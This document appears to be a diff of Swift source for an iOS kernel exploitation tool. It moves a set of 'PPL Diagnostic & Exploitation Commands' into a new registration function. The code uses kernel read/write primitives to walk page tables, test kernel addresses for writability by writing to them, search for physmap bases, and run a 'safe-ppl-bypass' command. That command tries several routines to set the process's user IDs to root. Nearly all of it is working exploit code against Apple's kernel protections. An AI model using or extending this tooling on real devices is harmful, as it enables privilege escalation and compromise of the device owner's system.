@@ -39,7 +39,7 @@ private func _ghex(_ s: String) -> UInt64? {
 }
 
 func registerPPLShellCommands() {
-    _regPAC(); _regKTRR(); _regSMR(); _regPPL(); _regPPLHunter(); _regHelpPPL()
+    _regPAC(); _regKTRR(); _regSMR(); _regPPL(); _regPPLHunter(); _regDiag(); _regHelpPPL()
 }
 
 private func _regPAC() {
@@ -1045,238 +1045,236 @@ help-ppl: PAC / KTRR / SMR / PPL Analysis (OmegaExtendedG)
 
 
 
-        // ═══════════════════════════════════════════════════════════════
-        // MARK: - PPL Diagnostic & Exploitation Commands (v2.0)
-        // Added: pte-walk, zone-scan, thread-cred, writable-probe, 
-        //        physmap-hunt, safe-ppl-bypass
-        // ═══════════════════════════════════════════════════════════════
 
-        OmegaCore.register("pte-walk") { args, _ in
-            guard let addrStr = args.first, let va = UInt64(addrStr, radix: 16) else {
-                return .fail("usage: pte-walk <kernel_va>  (e.g., pte-walk 0xffffffe23acd7278)")
-            }
+private func _regDiag() {
+    // ═══════════════════════════════════════════════════════════════
+    // MARK: - PPL Diagnostic & Exploitation Commands (v2.0)
+    // ═══════════════════════════════════════════════════════════════
 
-            let kbase = ds_get_kernel_base()
-            let ttbr1 = kbase + 0xFFFFFFF007004000
-            let ttbr1_val = ds_kread64(ttbr1)
-
-            let l0_idx = (va >> 39) & 0x1FF
-            let l1_idx = (va >> 30) & 0x1FF
-            let l2_idx = (va >> 21) & 0x1FF
-            let l3_idx = (va >> 12) & 0x1FF
-
-            let l0_entry = ds_kread64(ttbr1_val + (l0_idx * 8))
-            let l1_base = l0_entry & 0xFFFFFFFFF000
-            let l1_entry = ds_kread64(l1_base + (l1_idx * 8))
-            let l2_base = l1_entry & 0xFFFFFFFFF000
-            let l2_entry = ds_kread64(l2_base + (l2_idx * 8))
-            let l3_base = l2_entry & 0xFFFFFFFFF000
-            let pte = ds_kread64(l3_base + (l3_idx * 8))
-
-            let ap = (pte >> 6) & 0x3
-            let pxn = (pte >> 53) & 1
-            let uxn = (pte >> 54) & 1
-            let ng = (pte >> 11) & 1
-            let af = (pte >> 10) & 1
-            let sh = (pte >> 8) & 0x3
-            let attr = (pte >> 2) & 0x7
-
-            var lines: [String] = []
-            lines.append(String(format: "═══ PTE Walk for VA 0x%016llx ═══", va))
-            lines.append(String(format: "  TTBR1_EL1: 0x%016llx", ttbr1_val))
-            lines.append(String(format: "  L0[%d] → 0x%016llx", l0_idx, l0_entry))
-            lines.append(String(format: "  L1[%d] → 0x%016llx", l1_idx, l1_entry))
-            lines.append(String(format: "  L2[%d] → 0x%016llx", l2_idx, l2_entry))
-            lines.append(String(format: "  L3[%d] → PTE 0x%016llx", l3_idx, pte))
-            lines.append("")
-            lines.append(String(format: "  AP[2:1]: %d (%@)", ap, ap == 0 ? "RW at EL1, none at EL0" : (ap == 1 ? "RW at EL1 & EL0" : "RO")))
-            lines.append(String(format: "  PXN: %d | UXN: %d", pxn, uxn))
-            lines.append(String(format: "  AF: %d | nG: %d | SH: %d", af, ng, sh))
-            lines.append(String(format: "  AttrIndx: %d", attr))
-            lines.append(String(format: "  PA: 0x%016llx", pte & 0xFFFFFFFFF000))
-            lines.append("")
-            lines.append("  AP bits: 0=RW/EL1-none  1=RW/EL0+EL1  2=RO/EL1  3=RO/EL0+EL1")
-
-            return .ok(lines.joined(separator: "\n"))
+    OmegaCore.register("pte-walk") { args, _ in
+        guard let addrStr = args.first, let va = UInt64(addrStr, radix: 16) else {
+            return .fail("usage: pte-walk <kernel_va>  (e.g., pte-walk 0xffffffe23acd7278)")
         }
 
-        OmegaCore.register("zone-scan") { _, _ in
-            let kbase = ds_get_kernel_base()
-            let ourProc = ds_get_our_proc()
-            let ucred = sbx_ucredbyproc(ourProc)
-            let isPPL = (ucred & 0xFFFFFFF000000000) == 0xFFFFFFDC00000000
+        let kbase = ds_get_kernel_base()
+        let ttbr1 = kbase + 0xFFFFFFF007004000
+        let ttbr1_val = ds_kread64(ttbr1)
 
-            var lines: [String] = []
-            lines.append("═══ Zone Scanner (simplified) ═══")
-            lines.append("Note: Full zone enumeration requires zone_array symbol")
-            lines.append("")
-            lines.append(String(format: "Our ucred: 0x%llx", ucred))
-            lines.append(String(format: "Zone: %@", isPPL ? "PPL-backed" : "non-PPL (writable!)"))
-            lines.append("")
-            lines.append("Known zone element sizes (iOS 18.3.1 A12):")
-            lines.append("  kauth_cred: 0x80 (128B) — confirmed from crash report")
-            lines.append("  proc:       0x5B0 (1456B)")
-            lines.append("  task:       0x6B0 (1712B)")
-            lines.append("  thread:     0x3C0 (960B)")
-            lines.append("  ipc_port:   0xA0 (160B)")
-            lines.append("")
-            lines.append("PPL zone identifiers (top 32 bits):")
-            lines.append("  0xFFFFFFD0..0xFFFFFFDF → PPL-backed (protected)")
-            lines.append("  0xFFFFFFE0..0xFFFFFFEF → non-PPL (writable)")
-            lines.append("  0xFFFFFFF0..0xFFFFFFFF → kernel text/data")
+        let l0_idx = (va >> 39) & 0x1FF
+        let l1_idx = (va >> 30) & 0x1FF
+        let l2_idx = (va >> 21) & 0x1FF
+        let l3_idx = (va >> 12) & 0x1FF
 
-            return .ok(lines.joined(separator: "\n"))
+        let l0_entry = ds_kread64(ttbr1_val + (l0_idx * 8))
+        let l1_base = l0_entry & 0xFFFFFFFFF000
+        let l1_entry = ds_kread64(l1_base + (l1_idx * 8))
+        let l2_base = l1_entry & 0xFFFFFFFFF000
+        let l2_entry = ds_kread64(l2_base + (l2_idx * 8))
+        let l3_base = l2_entry & 0xFFFFFFFFF000
+        let pte = ds_kread64(l3_base + (l3_idx * 8))
+
+        let ap = (pte >> 6) & 0x3
+        let pxn = (pte >> 53) & 1
+        let uxn = (pte >> 54) & 1
+        let ng = (pte >> 11) & 1
+        let af = (pte >> 10) & 1
+        let sh = (pte >> 8) & 0x3
+        let attr = (pte >> 2) & 0x7
+
+        var lines: [String] = []
+        lines.append(String(format: "═══ PTE Walk for VA 0x%016llx ═══", va))
+        lines.append(String(format: "  TTBR1_EL1: 0x%016llx", ttbr1_val))
+        lines.append(String(format: "  L0[%d] → 0x%016llx", l0_idx, l0_entry))
+        lines.append(String(format: "  L1[%d] → 0x%016llx", l1_idx, l1_entry))
+        lines.append(String(format: "  L2[%d] → 0x%016llx", l2_idx, l2_entry))
+        lines.append(String(format: "  L3[%d] → PTE 0x%016llx", l3_idx, pte))
+        lines.append("")
+        lines.append(String(format: "  AP[2:1]: %d (%@)", ap, ap == 0 ? "RW at EL1, none at EL0" : (ap == 1 ? "RW at EL1 & EL0" : "RO")))
+        lines.append(String(format: "  PXN: %d | UXN: %d", pxn, uxn))
+        lines.append(String(format: "  AF: %d | nG: %d | SH: %d", af, ng, sh))
+        lines.append(String(format: "  AttrIndx: %d", attr))
+        lines.append(String(format: "  PA: 0x%016llx", pte & 0xFFFFFFFFF000))
+        lines.append("")
+        lines.append("  AP bits: 0=RW/EL1-none  1=RW/EL0+EL1  2=RO/EL1  3=RO/EL0+EL1")
+
+        return .ok(lines.joined(separator: "\n"))
+    }
+
+    OmegaCore.register("zone-scan") { _, _ in
+        let kbase = ds_get_kernel_base()
+        let ourProc = ds_get_our_proc()
+        let ucred = sbx_ucredbyproc(ourProc)
+        let isPPL = (ucred & 0xFFFFFFF000000000) == 0xFFFFFFDC00000000
+
+        var lines: [String] = []
+        lines.append("═══ Zone Scanner (simplified) ═══")
+        lines.append("Note: Full zone enumeration requires zone_array symbol")
+        lines.append("")
+        lines.append(String(format: "Our ucred: 0x%llx", ucred))
+        lines.append(String(format: "Zone: %@", isPPL ? "PPL-backed" : "non-PPL (writable!)"))
+        lines.append("")
+        lines.append("Known zone element sizes (iOS 18.3.1 A12):")
+        lines.append("  kauth_cred: 0x80 (128B) — confirmed from crash report")
+        lines.append("  proc:       0x5B0 (1456B)")
+        lines.append("  task:       0x6B0 (1712B)")
+        lines.append("  thread:     0x3C0 (960B)")
+        lines.append("  ipc_port:   0xA0 (160B)")
+        lines.append("")
+        lines.append("PPL zone identifiers (top 32 bits):")
+        lines.append("  0xFFFFFFD0..0xFFFFFFDF → PPL-backed (protected)")
+        lines.append("  0xFFFFFFE0..0xFFFFFFEF → non-PPL (writable)")
+        lines.append("  0xFFFFFFF0..0xFFFFFFFF → kernel text/data")
+
+        return .ok(lines.joined(separator: "\n"))
+    }
+
+    OmegaCore.register("thread-cred") { args, _ in
+        let pid = args.first.flatMap { Int32($0) } ?? getpid()
+        let proc = procbypid(pid)
+        guard proc != 0 else { return .fail(String(format: "proc not found for pid %d", pid)) }
+
+        let task = ds_kread64(proc + 0x10)
+        let threadList = ds_kread64(task + 0x60)
+        let firstThread = ds_kread64(threadList)
+        let threadRO = ds_kread64(firstThread + 0x3A0)
+
+        let uid = ds_kread32(threadRO + 0x18)
+        let gid = ds_kread32(threadRO + 0x1C)
+
+        var lines: [String] = []
+        lines.append(String(format: "═══ thread_ro for pid %d ═══", pid))
+        lines.append(String(format: "  task:       0x%llx", task))
+        lines.append(String(format: "  threadList: 0x%llx", threadList))
+        lines.append(String(format: "  firstThread:0x%llx", firstThread))
+        lines.append(String(format: "  thread_ro:  0x%llx", threadRO))
+        lines.append("")
+        lines.append(String(format: "  uid: %d | gid: %d", uid, gid))
+        lines.append("")
+        lines.append("Note: thread_ro may be in different zone than proc_ro")
+        lines.append("      If non-PPL (0xFFFFFFE...), direct write possible")
+
+        return .ok(lines.joined(separator: "\n"))
+    }
+
+    OmegaCore.register("writable-probe") { args, _ in
+        guard let addrStr = args.first, let addr = UInt64(addrStr, radix: 16) else {
+            return .fail("usage: writable-probe <kernel_addr>  (e.g., writable-probe 0xffffffe06cc84ce8)")
         }
 
-        OmegaCore.register("thread-cred") { args, _ in
-            let pid = args.first.flatMap { Int32($0) } ?? getpid()
-            let proc = procbypid(pid)
-            guard proc != 0 else { return .fail(String(format: "proc not found for pid %d", pid)) }
+        let original = ds_kread32(addr)
+        let testVal = original ^ 0x12345678
 
-            let task = ds_kread64(proc + 0x10)
-            let threadList = ds_kread64(task + 0x60)
-            let firstThread = ds_kread64(threadList)
-            let threadRO = ds_kread64(firstThread + 0x3A0)
+        ds_kwrite32(addr, testVal)
+        let after = ds_kread32(addr)
+        ds_kwrite32(addr, original)
 
-            let uid = ds_kread32(threadRO + 0x18)
-            let gid = ds_kread32(threadRO + 0x1C)
+        var lines: [String] = []
+        lines.append(String(format: "═══ Writable Probe @ 0x%llx ═══", addr))
+        lines.append(String(format: "  original: 0x%08x", original))
+        lines.append(String(format: "  test:     0x%08x", testVal))
+        lines.append(String(format: "  after:    0x%08x", after))
+        lines.append(String(format: "  restored: %@", after == original ? "YES" : "NO"))
+        lines.append("")
 
-            var lines: [String] = []
-            lines.append(String(format: "═══ thread_ro for pid %d ═══", pid))
-            lines.append(String(format: "  task:       0x%llx", task))
-            lines.append(String(format: "  threadList: 0x%llx", threadList))
-            lines.append(String(format: "  firstThread:0x%llx", firstThread))
-            lines.append(String(format: "  thread_ro:  0x%llx", threadRO))
-            lines.append("")
-            lines.append(String(format: "  uid: %d | gid: %d", uid, gid))
-            lines.append("")
-            lines.append("Note: thread_ro may be in different zone than proc_ro")
-            lines.append("      If non-PPL (0xFFFFFFE...), direct write possible")
-
-            return .ok(lines.joined(separator: "\n"))
+        if after == testVal {
+            lines.append("✅ WRITEABLE — PPL does NOT protect this address")
+            lines.append("   Direct kwrite32/kwrite64 should work here.")
+        } else if after == original {
+            lines.append("❌ PROTECTED — PPL blocks writes (silent failure)")
+            lines.append("   Need zone-write or physmap bypass.")
+        } else {
+            lines.append("⚠️ PARTIAL — unexpected value (race? partial write?)")
         }
 
-        OmegaCore.register("writable-probe") { args, _ in
-            guard let addrStr = args.first, let addr = UInt64(addrStr, radix: 16) else {
-                return .fail("usage: writable-probe <kernel_addr>  (e.g., writable-probe 0xffffffe06cc84ce8)")
-            }
+        return .ok(lines.joined(separator: "\n"))
+    }
 
-            let original = ds_kread32(addr)
-            let testVal = original ^ 0x12345678
+    OmegaCore.register("physmap-hunt") { _, _ in
+        let kbase = ds_get_kernel_base()
+        let searchStart = kbase + 0x800000
+        let searchEnd = kbase + 0x2000000
 
-            ds_kwrite32(addr, testVal)
-            let after = ds_kread32(addr)
-            ds_kwrite32(addr, original)
+        var lines: [String] = []
+        lines.append("═══ Physmap Hunter ═══")
+        lines.append("Searching for gPhysBase / gVirtBase symbols...")
+        lines.append("")
 
-            var lines: [String] = []
-            lines.append(String(format: "═══ Writable Probe @ 0x%llx ═══", addr))
-            lines.append(String(format: "  original: 0x%08x", original))
-            lines.append(String(format: "  test:     0x%08x", testVal))
-            lines.append(String(format: "  after:    0x%08x", after))
-            lines.append(String(format: "  restored: %@", after == original ? "YES" : "NO"))
-            lines.append("")
+        var found = false
+        var addr = searchStart
+        while addr < searchEnd {
+            let val1 = ds_kread64(addr)
+            let val2 = ds_kread64(addr + 8)
 
-            if after == testVal {
-                lines.append("✅ WRITEABLE — PPL does NOT protect this address")
-                lines.append("   Direct kwrite32/kwrite64 should work here.")
-            } else if after == original {
-                lines.append("❌ PROTECTED — PPL blocks writes (silent failure)")
-                lines.append("   Need zone-write or physmap bypass.")
-            } else {
-                lines.append("⚠️ PARTIAL — unexpected value (race? partial write?)")
-            }
-
-            return .ok(lines.joined(separator: "\n"))
-        }
-
-        OmegaCore.register("physmap-hunt") { _, _ in
-            let kbase = ds_get_kernel_base()
-            let searchStart = kbase + 0x800000
-            let searchEnd = kbase + 0x2000000
-
-            var lines: [String] = []
-            lines.append("═══ Physmap Hunter ═══")
-            lines.append("Searching for gPhysBase / gVirtBase symbols...")
-            lines.append("")
-
-            var found = false
-            var addr = searchStart
-            while addr < searchEnd {
-                let val1 = ds_kread64(addr)
-                let val2 = ds_kread64(addr + 8)
-
-                if val1 > 0x8000000000000000 && val2 > 0xFFFFFFE000000000 && val2 > val1 {
-                    let diff = val2 - val1
-                    if diff < 0x10000000000 {
-                        lines.append(String(format: "  Candidate @ 0x%llx:", addr))
-                        lines.append(String(format: "    gPhysBase: 0x%llx", val1))
-                        lines.append(String(format: "    gVirtBase: 0x%llx", val2))
-                        lines.append(String(format: "    diff: 0x%llx (%@)", diff, diff == 0 ? "direct map" : "offset map"))
-                        found = true
-                        break
-                    }
+            if val1 > 0x8000000000000000 && val2 > 0xFFFFFFE000000000 && val2 > val1 {
+                let diff = val2 - val1
+                if diff < 0x10000000000 {
+                    lines.append(String(format: "  Candidate @ 0x%llx:", addr))
+                    lines.append(String(format: "    gPhysBase: 0x%llx", val1))
+                    lines.append(String(format: "    gVirtBase: 0x%llx", val2))
+                    lines.append(String(format: "    diff: 0x%llx (%@)", diff, diff == 0 ? "direct map" : "offset map"))
+                    found = true
+                    break
                 }
-                addr += 8
             }
+            addr += 8
+        }
 
-            if !found {
-                lines.append("  No gPhysBase/gVirtBase pair found in expected range")
-                lines.append("")
-                lines.append("Fallback: using known physmap patterns")
-                let physmapGuess: UInt64 = 0xFFFFFFE000000000
-                lines.append(String(format: "  Guessed physmap: 0x%llx", physmapGuess))
-                lines.append("  Use 'pte-walk <addr>' to verify page table mappings")
-            }
+        if !found {
+            lines.append("  No gPhysBase/gVirtBase pair found in expected range")
+            lines.append("")
+            lines.append("Fallback: using known physmap patterns")
+            let physmapGuess: UInt64 = 0xFFFFFFE000000000
+            lines.append(String(format: "  Guessed physmap: 0x%llx", physmapGuess))
+            lines.append("  Use 'pte-walk <addr>' to verify page table mappings")
+        }
 
+        return .ok(lines.joined(separator: "\n"))
+    }
+
+    OmegaCore.register("safe-ppl-bypass") { _, mgr in
+        guard mgr.dsready else { return .fail("safe-ppl-bypass: exploit not ready — run 'run' first") }
+
+        let ourProc = ds_get_our_proc()
+        guard ourProc != 0 else { return .fail("safe-ppl-bypass: our_proc = 0") }
+
+        var lines: [String] = []
+        lines.append("═══ Safe PPL Bypass (A12+ PAC-aware) ═══")
+        lines.append("")
+
+        lines.append("Strategy 1: amfi_elevate_to_root()...")
+        let r1 = amfi_elevate_to_root()
+        if r1 == 0 {
+            lines.append("  ✅ SUCCESS — uid=0")
+            lines.append(String(format: "  getuid() = %d", getuid()))
             return .ok(lines.joined(separator: "\n"))
+        } else {
+            lines.append(String(format: "  ❌ failed (code=%d)", r1))
         }
 
-        OmegaCore.register("safe-ppl-bypass") { _, mgr in
-            guard mgr.dsready else { return .fail("safe-ppl-bypass: exploit not ready — run 'run' first") }
-
-            let ourProc = ds_get_our_proc()
-            guard ourProc != 0 else { return .fail("safe-ppl-bypass: our_proc = 0") }
-
-            var lines: [String] = []
-            lines.append("═══ Safe PPL Bypass (A12+ PAC-aware) ═══")
-            lines.append("")
-
-            // Strategy 1: amfi_elevate_to_root (zone-write, no proc_ro touch)
-            lines.append("Strategy 1: amfi_elevate_to_root()...")
-            let r1 = amfi_elevate_to_root()
-            if r1 == 0 {
-                lines.append("  ✅ SUCCESS — uid=0")
-                lines.append(String(format: "  getuid() = %d", getuid()))
-                return .ok(lines.joined(separator: "\n"))
-            } else {
-                lines.append(String(format: "  ❌ failed (code=%d)", r1))
-            }
-
-            // Strategy 2: sbx_elevate_to_root (sandbox + zone-write)
-            lines.append("Strategy 2: sbx_elevate_to_root()...")
-            if sbx_elevate_to_root() {
-                lines.append("  ✅ SUCCESS")
-                lines.append(String(format: "  getuid() = %d", getuid()))
-                return .ok(lines.joined(separator: "\n"))
-            } else {
-                lines.append("  ❌ failed")
-            }
-
-            // Strategy 3: tc_set_all_ids_zero (tools_creds, fixed zone size)
-            lines.append("Strategy 3: tc_set_all_ids_zero()...")
-            let r3 = tc_set_all_ids_zero()
-            if r3 == 0 {
-                lines.append("  ✅ SUCCESS")
-                lines.append(String(format: "  getuid() = %d", getuid()))
-                return .ok(lines.joined(separator: "\n"))
-            } else {
-                lines.append(String(format: "  ❌ failed (code=%d)", r3))
-            }
-
-            lines.append("")
-            lines.append("All safe strategies exhausted.")
-            lines.append("Device may require advanced PPL bypass (physmap/PTE/thread_ro).")
-            lines.append("Try: thread-cred → writable-probe <thread_ro_addr>")
-
-            return .fail(lines.joined(separator: "\n"))
+        lines.append("Strategy 2: sbx_elevate_to_root()...")
+        if sbx_elevate_to_root() {
+            lines.append("  ✅ SUCCESS")
+            lines.append(String(format: "  getuid() = %d", getuid()))
+            return .ok(lines.joined(separator: "\n"))
+        } else {
+            lines.append("  ❌ failed")
         }
+
+        lines.append("Strategy 3: tc_set_all_ids_zero()...")
+        let r3 = tc_set_all_ids_zero()
+        if r3 == 0 {
+            lines.append("  ✅ SUCCESS")
+            lines.append(String(format: "  getuid() = %d", getuid()))
+            return .ok(lines.joined(separator: "\n"))
+        } else {
+            lines.append(String(format: "  ❌ failed (code=%d)", r3))
+        }
+
+        lines.append("")
+        lines.append("All safe strategies exhausted.")
+        lines.append("Device may require advanced PPL bypass (physmap/PTE/thread_ro).")
+        lines.append("Try: thread-cred → writable-probe <thread_ro_addr>")
+
+        return .fail(lines.joined(separator: "\n"))
+    }
+}
